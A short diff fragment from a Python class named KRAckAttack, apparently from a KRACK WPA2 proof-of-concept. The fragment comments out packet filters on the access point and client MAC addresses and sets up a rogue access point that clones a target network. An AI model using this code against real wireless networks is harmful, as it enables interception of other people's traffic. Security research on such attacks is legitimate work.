@@ -881,12 +881,13 @@ class KRAckAttack():
 			subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 
 
-		# FIXME: Set BFP filters to increase performance, can't set suceessful.
-		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
-		if self.clientmac:
-			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
-		self.sock_real.attach_filter(bpf)
-		self.sock_rogue.attach_filter(bpf)
+		# # FIXME: Set BFP filters to increase performance, can't set suceessful.
+		# bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
+		# if self.clientmac:
+		# 	bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
+		# bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
+		# self.sock_real.attach_filter(bpf)
+		# self.sock_rogue.attach_filter(bpf)
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
